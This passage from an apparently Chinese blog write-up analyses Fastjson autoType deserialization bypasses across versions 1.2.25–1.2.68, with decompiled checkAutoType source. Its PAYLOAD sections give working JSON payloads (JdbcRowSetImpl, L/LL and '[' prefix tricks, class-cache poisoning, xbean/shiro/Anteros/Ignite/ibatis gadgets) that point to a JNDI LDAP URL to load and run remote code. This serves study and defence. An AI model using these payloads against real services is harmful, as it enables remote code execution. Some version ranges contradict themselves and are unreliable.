classLoader.loadClass(className);<span class="hljs-comment">//加载类</span><br>                    mappings.put(className, clazz);<span class="hljs-comment">//将类添加到map中</span><br>                    <span class="hljs-keyword">return</span> clazz;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Throwable var6) &#123;<br>                var6.printStackTrace();<br>            &#125;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">contextClassLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<span class="hljs-comment">//获取ClassLoader</span><br>                <span class="hljs-keyword">if</span> (contextClassLoader != <span class="hljs-literal">null</span> &amp;&amp; contextClassLoader != classLoader) &#123;<br>                    clazz = contextClassLoader.loadClass(className);<span class="hljs-comment">//加载类</span><br>                    mappings.put(className, clazz);<span class="hljs-comment">//将类添加到map中</span><br>                    <span class="hljs-keyword">return</span> clazz;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Throwable var5) &#123;<br>            &#125;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                clazz = Class.forName(className);<br>                mappings.put(className, clazz);<br>                <span class="hljs-keyword">return</span> clazz;<br>            &#125; <span class="hljs-keyword">catch</span> (Throwable var4) &#123;<br>                <span class="hljs-keyword">return</span> clazz;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>第一个JSON对象解析完毕，开始解析第二个JSON对象，重新进入checkAutoType()，因解析第一个JSON时已把 JdbcRowSetImpl 对象缓存到map中，故此处可直接获取到目标类。</p><p>1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32 未开启autoTypeSupport,可成功利用</p><p><img src="/image/image-20220909151611298-16627077738143.png" alt="image-20220909151611298"></p><p>1.2.33 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.347 autoTypeSupport开启与否均可成功利用</p><p>checkAutoType源码修改，若autoTypeSupport为true,当目标类在黑名单中，需要目标类不在map中才会抛出异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;<br>    <span class="hljs-keyword">if</span> (typeName == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (typeName.length() &gt;= <span class="hljs-built_in">this</span>.maxTypeNameLength) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> typeName.replace(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.autoTypeSupport || expectClass != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">int</span> i;<br>            String deny;<br>            <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.acceptList.length; ++i) &#123;<br>                deny = <span class="hljs-built_in">this</span>.acceptList[i];<br>                <span class="hljs-keyword">if</span> (className.startsWith(deny)) &#123;<br>                    <span class="hljs-keyword">return</span> TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader);<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.denyList.length; ++i) &#123;<br>                deny = <span class="hljs-built_in">this</span>.denyList[i];<br>                <span class="hljs-comment">//若目标类在黑名单中且不在map中才会抛出异常</span><br>                <span class="hljs-keyword">if</span> (className.startsWith(deny) &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);<br>        <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>            clazz = <span class="hljs-built_in">this</span>.deserializers.findClass(typeName);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> clazz; <span class="hljs-comment">//返回目标类</span><br>            &#125;<br></code></pre></td></tr></table></figure><h5 id="PAYLOAD-3"><a href="#PAYLOAD-3" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JAVA">&#123;<br> <span class="hljs-string">&quot;A&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<br> <span class="hljs-string">&quot;B&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-Fastjson-1-2-42"><a href="#3-Fastjson-1-2-42" class="headerlink" title="3 Fastjson &#x3D; 1.2.42"></a>3 Fastjson &#x3D; 1.2.42</h3><h5 id="利用条件：-4"><a href="#利用条件：-4" class="headerlink" title="利用条件："></a>利用条件：</h5><p>Fastjson &lt;&#x3D; 1.2.42 开启autoTypeSupport</p><h5 id="利用链分析：-4"><a href="#利用链分析：-4" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>Fastjson1.2.42将黑名单由字符串直接比对改为了HashCode。checkAutoType()中在黑名单绕过的时候做了一个校验，如果类名以L开头，;结尾，则会用stubstring()去除类名前的第一个L,双写L即可绕过</p><p><img src="/image/image-20220909165153536-16627135155325.png" alt="image-20220909165153536"></p><h5 id="PAYLOAD-4"><a href="#PAYLOAD-4" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JAVA">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);  <span class="hljs-comment">//开启autoTypeSupport</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-Fastjson-1-2-43"><a href="#4-Fastjson-1-2-43" class="headerlink" title="4 Fastjson &#x3D; 1.2.43"></a>4 Fastjson &#x3D; 1.2.43</h3><h5 id="利用条件：-5"><a href="#利用条件：-5" class="headerlink" title="利用条件："></a>利用条件：</h5><p>Fastjson &lt;&#x3D; 1.2.43开启autoTypeSupport</p><h5 id="利用链分析：-5"><a href="#利用链分析：-5" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>Fastjson &lt;&#x3D; 1.2.43，checkAutoType()对LL进行了判断，如果类以LL开头，抛出异常,但在TypeUtils.loadClass中，还对[进行了处理，因此又可以通过[来进行绕过</p><p>ParserConfig#checkAutoType()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (((-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(className.length() - <span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> == <span class="hljs-number">655701488918567152L</span>) &#123;<br>    <span class="hljs-keyword">if</span> (((-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> == <span class="hljs-number">655656408941810501L</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>    &#125;<br><br>    className = className.substring(<span class="hljs-number">1</span>, className.length() - <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>TypeUtils#loadClass()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">return</span> clazz;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (className.charAt(<span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<br>    Class&lt;?&gt; componentType = loadClass(className.substring(<span class="hljs-number">1</span>), classLoader);<br>    <span class="hljs-keyword">return</span> Array.newInstance(componentType, <span class="hljs-number">0</span>).getClass();<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (className.startsWith(<span class="hljs-string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="hljs-string">&quot;;&quot;</span>)) &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">newClassName</span> <span class="hljs-operator">=</span> className.substring(<span class="hljs-number">1</span>, className.length() - <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> loadClass(newClassName, classLoader);<br>&#125; <br></code></pre></td></tr></table></figure><h5 id="PAYLOAD-5"><a href="#PAYLOAD-5" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);  <span class="hljs-comment">//开启autoTypeSupport</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="5Fastjson-1-2-44"><a href="#5Fastjson-1-2-44" class="headerlink" title="5Fastjson &#x3D; 1.2.44"></a>5Fastjson &#x3D; 1.2.44</h3><h5 id="利用链分析：-6"><a href="#利用链分析：-6" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>Fastjson &#x3D; 1.2.44修复了[的绕过，在checkAutoType中进行判断如果类名以[或L开头抛出异常。L[让绕过方法失效，可使用JSON内置payload</p><p><img src="/image/2fd4e3fa452461f51e7ab30b40d2e497.png" alt="preload"></p><h5 id="PAYLOAD-6"><a href="#PAYLOAD-6" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br> <span class="hljs-string">&quot;A&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<br> <span class="hljs-string">&quot;B&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="6Fastjson-1-2-47"><a href="#6Fastjson-1-2-47" class="headerlink" title="6Fastjson &#x3D; 1.2.47"></a>6Fastjson &#x3D; 1.2.47</h3><h5 id="利用条件：-6"><a href="#利用条件：-6" class="headerlink" title="利用条件："></a>利用条件：</h5><p>1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32 未开启autoTypeSupport</p><p>1.2.33 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32  autoTypeSupport开启或未开启均可利用</p><h5 id="利用链分析：-7"><a href="#利用链分析：-7" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>利用链为上述1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.41中PAYLOAD2利用链</p><h5 id="PAYLOAD-7"><a href="#PAYLOAD-7" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br> <span class="hljs-string">&quot;A&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<br> <span class="hljs-string">&quot;B&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="71-2-48"><a href="#71-2-48" class="headerlink" title="71.2.48 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.67"></a>71.2.48 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.67</h3><h5 id="利用条件：-7"><a href="#利用条件：-7" class="headerlink" title="利用条件："></a>利用条件：</h5><p>1.2.48 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.67 </p><h5 id="利用链分析：-8"><a href="#利用链分析：-8" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>Fastjson1.2.48修复JSON内置绕过方法，此版本内多为针对黑名单绕过，需要相应组件才可使用</p><h5 id="PAYLOAD-8"><a href="#PAYLOAD-8" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><p>fastjson &lt;&#x3D; 1.2.62黑名单绕过：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//依赖</span><br><span class="hljs-comment">//&lt;dependency&gt;</span><br><span class="hljs-comment">//          &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;</span><br><span class="hljs-comment">//          &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;</span><br><span class="hljs-comment">//          &lt;version&gt;x.x&lt;/version&gt;</span><br><span class="hljs-comment">//     &lt;/dependency&gt;</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="hljs-string">&quot;AsText&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125;<span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure><p>fastjson &lt;&#x3D; 1.2.66黑名单绕过，需autoTypeSupport属性为true</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="hljs-string">&quot;resourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125; <br><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="hljs-string">&quot;metricRegistry&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>,<span class="hljs-string">&quot;jndiNames&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125; <br><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span>,<span class="hljs-string">&quot;properties:&#123;&quot;</span><span class="hljs-meta">@type</span><span class="hljs-string">&quot;:&quot;</span>java.util.Properties<span class="hljs-string">&quot;,&quot;</span>UserTransaction<span class="hljs-string">&quot;:&quot;</span>ldap:<span class="hljs-comment">//127.0.0.1:1389/Basic/Command/calc&quot;&#125;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="8Fastjson-1-2-68"><a href="#8Fastjson-1-2-68" class="headerlink" title="8Fastjson &#x3D; 1.2.68"></a>8Fastjson &#x3D; 1.2.68</h3><h5 id="利用条件：-8"><a href="#利用条件：-8" class="headerlink" title="利用条件："></a>利用条件：</h5><p>存在相应依赖</p><h5 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析:"></a>利用链分析:</h5><h6 id="1-checkAutoType"><a href="#1-checkAutoType" class="headerlink" title="1.checkAutoType"></a>1.checkAutoType</h6><p>FastJSON1.2.68新引入safeMode，配置safeMode为true,黑白名单均不支持autoType,默认为false,不影响代码调用。经过源码分析，达到以下条件则可通过ParserConfig#checkAutoType()安全校验：</p><p>expectClass为空：</p><ol><li>typeNmae不在denyHashCodes黑名单中（必须条件）</li><li>SafeMode为false（必要条件，默认为false）</li><li>typeName在TypeUtils#mappings中且expectClass为空且typeName不为HashMap且不为expectClass子类</li></ol><p>expectClass不为空：</p><ol><li>typeNmae和expectClass均不在denyHashCodes黑名单中（必须条件）</li><li>autoTypeSupport为false（默认为false）</li><li>expectClass在TypeUtils#mappings中</li><li>typeName不是ClassLoader、DataSource、RowSet的子类</li><li>expectClass不为null，且不为Object.class、Serializable.class、Cloneable.class、Closeable.class、EventListener.class、Iterable.class、Collection.class</li><li>typeName是expectClass的子类</li></ol><p>ParserConfig#checkAutoType()方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="hljs-type">int</span> features) &#123;<br>    <span class="hljs-keyword">if</span> (typeName == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.autoTypeCheckHandlers != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//默认为空 不进入</span><br>            <span class="hljs-type">Iterator</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.autoTypeCheckHandlers.iterator();<br><br>            <span class="hljs-keyword">while</span>(var4.hasNext()) &#123;<br>                <span class="hljs-type">AutoTypeCheckHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (AutoTypeCheckHandler)var4.next();<br>                Class&lt;?&gt; type = h.handler(typeName, expectClass, features);<br>                <span class="hljs-keyword">if</span> (type != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">return</span> type;<br>                &#125;<br>            &#125;<br>        &#125;<br><span class="hljs-comment">//1.2.68新引入safeMode，配置safeMode为true,黑白名单均不支持autoType,默认为false</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">safeModeMask</span> <span class="hljs-operator">=</span> Feature.SafeMode.mask;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">safeMode</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.safeMode || (features &amp; safeModeMask) != <span class="hljs-number">0</span> || (JSON.DEFAULT_PARSER_FEATURE &amp; safeModeMask) != <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (safeMode) &#123;<span class="hljs-comment">//默认不进入</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;safeMode not support autoType : &quot;</span> + typeName);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (typeName.length() &lt; <span class="hljs-number">192</span> &amp;&amp; typeName.length() &gt;= <span class="hljs-number">3</span>) &#123;<br>            <span class="hljs-type">boolean</span> expectClassFlag;<br>            <span class="hljs-keyword">if</span> (expectClass == <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//expectClass为期望类，</span><br>                expectClassFlag = <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (expectClass != Object.class &amp;&amp; expectClass != Serializable.class &amp;&amp; expectClass != Cloneable.class &amp;&amp; expectClass != Closeable.class &amp;&amp; expectClass != EventListener.class &amp;&amp; expectClass != Iterable.class &amp;&amp; expectClass != Collection.class) &#123;<span class="hljs-comment">//判断期望类是否为以上类</span><br>                expectClassFlag = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                expectClassFlag = <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> typeName.replace(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>            <span class="hljs-type">long</span> <span class="hljs-variable">BASIC</span> <span class="hljs-operator">=</span> -<span class="hljs-number">3750763034362895579L</span>;<br>            <span class="hljs-type">long</span> <span class="hljs-variable">PRIME</span> <span class="hljs-operator">=</span> <span class="hljs-number">1099511628211L</span>;<br>            <span class="hljs-type">long</span> <span class="hljs-variable">h1</span> <span class="hljs-operator">=</span> (-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span>;<br>            